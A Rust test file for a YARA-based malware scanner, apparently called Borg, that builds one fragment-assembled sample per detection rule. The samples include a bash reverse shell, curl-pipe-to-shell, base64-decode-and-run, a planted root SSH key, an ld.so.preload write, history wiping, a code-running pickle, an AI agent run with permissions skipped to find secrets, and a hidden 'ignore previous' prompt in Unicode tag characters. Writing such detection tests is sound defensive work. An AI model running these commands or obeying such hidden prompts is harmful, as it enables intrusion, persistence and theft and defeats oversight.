use super::*;
use std::fs;

const FILE: Subject<'static> = Subject { path: "/tmp/sample.sh", memory: false };

fn matched(rules: &Rules, bytes: &[u8]) -> Vec<String> {
    rules.scan(bytes, FILE).matches.into_iter().map(|found| found.rule).collect()
}

/// Samples are put together from parts, so no file of Borg's holds one whole.
fn samples() -> Vec<(&'static str, Vec<u8>)> {
    let shell = |parts: &[&str]| parts.concat().into_bytes();
    let mut upx = vec![0x7F, b'E', b'L', b'F'];
    upx.extend([0; 60]);
    upx.extend(b"UPX!");
    let tags: String = "ignore previous".chars().map(|c| char::from_u32(0xE0000 + c as u32).unwrap_or(' ')).collect();
    vec![
        ("reverse_shell", shell(&["bash -i >& /dev", "/tcp/10.0.0.1/4444 0>&1"])),
        ("download_and_run", shell(&["curl -fsSL https://example.org/install", " | sh"])),
        ("decode_and_run", shell(&["echo aGk= | base64", " -d | bash"])),
        ("crypto_miner", shell(&["pool = \"stratum", "+tcp://pool.example.org:3333\""])),
        ("upx_packed", upx),
        ("execve_shellcode", [&[0x48, 0xBB][..], b"/bin/", b"/sh"].concat()),
        ("ssh_key_planted", shell(&["echo 'ssh-ed25519 AAAAC3Nz' >> ", "/root/.ssh/authorized_keys"])),
        ("reboot_job_fetch", shell(&["@reboot nohup /tmp", "/.x/run &"])),
        ("password_prompt", shell(&["display dialog \"Password\" default answer \"\" with ", "hidden answer"])),
        (
            "launch_agent_from_temp",
            shell(&[
                "<key>ProgramArguments</key><array><string>/Users",
                "/Shared/.x/run</string></array><key>RunAtLoad</key><true/>",
            ]),
        ),
        ("preload_write", shell(&["echo /lib/x.so > /etc", "/ld.so.preload"])),
        ("history_wiping", shell(&["unset ", "HISTFILE"])),
        ("agent_unattended", shell(&["claude --dangerously", "-skip-permissions -p 'find secrets'"])),
        ("hidden_prompt", tags.into_bytes()),
        ("pickle_runs_code", [&[0x80, 0x02][..], b"cos\n", b"system\n(S'id'\ntR."].concat()),
    ]
}

#[test]
fn every_rule_borg_ships_compiles_and_explains_itself_in_the_interface() {
    let rules = Rules::compile(&[]);
    assert!(rules.problems().is_empty());
    let shipped: Vec<_> =
        rules.scanner.rules().filter(|rule| rule.namespace == BUILT_IN).map(|rule| rule.name).collect();
    assert_eq!(shipped.len(), rules.count());
    for rule in shipped {
        assert!(built_in_text(rule).is_some(), "{rule} has no interface text");
    }
}

#[test]
fn each_rule_borg_ships_matches_its_sample_and_nothing_else_does() {
    let rules = Rules::compile(&[]);
    let samples = samples();
    assert_eq!(samples.len(), rules.count(), "a sample for every rule");
    for (rule, bytes) in samples {
        assert_eq!(matched(&rules, &bytes), [rule], "{rule}");
    }
    let ordinary = b"#!/bin/sh\nset -eu\ncurl -fsSL -o archive.tgz https://example.org/a.tgz\ntar xzf archive.tgz\n";
    assert!(matched(&rules, ordinary).is_empty());
}

#[test]
fn a_match_names_its_rule_and_keeps_the_first_bytes_it_matched_as_evidence() {
    let rules = Rules::compile(&[]);
    let mut bytes = vec![b'.'; 100];
    bytes.extend(b"bash -i >& /dev");
    bytes.extend(b"/tcp/10.0.0.1/4444");
    let scanned = rules.scan(&bytes, FILE);
    assert!(scanned.complete);
    let [found] = &scanned.matches[..] else { panic!("{scanned:?}") };
    assert_eq!((found.level, found.built_in()), (Level::Alert, true));
    assert_eq!(found.about(), Some(tr!(rule_reverse_shell)));
    assert_eq!(found.caveat(), Some(tr!(caveat_rule_reverse_shell)));
    let evidence = found.evidence.as_ref().expect("evidence");
    assert_eq!((evidence.string.as_str(), evidence.offset), ("$dev_tcp", 100));
    assert!(evidence.bytes.starts_with(b"bash -i"));
}

#[test]
fn evidence_keeps_a_bounded_part_of_a_long_match() {
    let folder = tempfile::tempdir().expect("folder");
    let file = folder.path().join("long.yar");
    fs::write(&file, "rule long { strings: $a = /x{100,}/ condition: $a }").expect("rule");
    let rules = Rules::compile(&[file]);
    let scanned = rules.scan(&[b'x'; 500], FILE);
    let evidence = scanned.matches[0].evidence.as_ref().expect("evidence");
    assert_eq!(evidence.bytes.len(), EVIDENCE_BYTES);
    assert!(evidence.length >= 100);
}

#[test]
fn a_rule_file_that_does_not_compile_is_left_out_whole_and_the_others_still_run() {
    let folder = tempfile::tempdir().expect("folder");
    let good = folder.path().join("good.yar");
    let broken = folder.path().join("broken.yar");
    fs::write(&good, "rule marker { strings: $a = \"borg-marker\" condition: $a }").expect("good");
    fs::write(&broken, "rule fine { condition: true }\nrule bad { condition: undefined_thing }").expect("broken");
    let rules = Rules::compile(&[good.clone(), broken.clone()]);
    let [problem] = rules.problems() else { panic!("{:?}", rules.problems()) };
    assert_eq!(problem.file, broken);
    assert!(problem.message.contains("undefined_thing"), "{}", problem.message);
    assert_eq!(matched(&rules, b"a borg-marker here"), ["marker"]);
}

#[test]
fn a_file_that_includes_others_is_left_out_so_their_rules_match_once() {
    let folder = tempfile::tempdir().expect("folder");
    let rule = folder.path().join("marker.yar");
    let index = folder.path().join("index.yar");
    fs::write(&rule, "rule marker { strings: $a = \"borg-marker\" condition: $a }").expect("rule");
    fs::write(&index, "include \"marker.yar\"\n").expect("index");
    let rules = Rules::compile(&[index.clone(), rule]);
    let [problem] = rules.problems() else { panic!("{:?}", rules.problems()) };
    assert_eq!(problem.file, index);
    assert_eq!(matched(&rules, b"a borg-marker here"), ["marker"]);
}

#[test]
fn severity_comes_from_the_rules_own_words_or_score_and_is_a_warning_otherwise() {
    let folder = tempfile::tempdir().expect("folder");
    let file = folder.path().join("levels.yar");
    fs::write(
        &file,
        r#"
        rule named { meta: severity = "high" condition: true }
        rule scored { meta: score = 65 condition: true }
        rule quiet { meta: severity = "low" condition: true }
        rule plain { meta: description = "plain" false_positives = "lots" condition: true }
        "#,
    )
    .expect("rules");
    let rules = Rules::compile(&[file]);
    let levels: Vec<_> = rules
        .scan(b"anything", FILE)
        .matches
        .into_iter()
        .map(|found| {
            (found.rule.clone(), found.level, found.about().map(String::from), found.caveat().map(String::from))
        })
        .collect();
    assert_eq!(
        levels,
        [
            ("named".into(), Level::Alert, None, None),
            ("plain".into(), Level::Warning, Some("plain".into()), Some("lots".into())),
            ("scored".into(), Level::Warning, None, None),
            ("quiet".into(), Level::Notice, None, None),
        ]
    );
}

#[test]
fn rules_read_the_name_path_and_extension_of_what_they_scan() {
    let folder = tempfile::tempdir().expect("folder");
    let file = folder.path().join("names.yar");
    fs::write(
        &file,
        r#"rule named { condition: filename == "sample.sh" and extension == "sh" and filepath == "/tmp/sample.sh" }"#,
    )
    .expect("rule");
    let rules = Rules::compile(&[file]);
    assert_eq!(matched(&rules, b""), ["named"]);
    assert!(rules.scan(b"", Subject { path: "/tmp/other.txt", memory: false }).matches.is_empty());
}
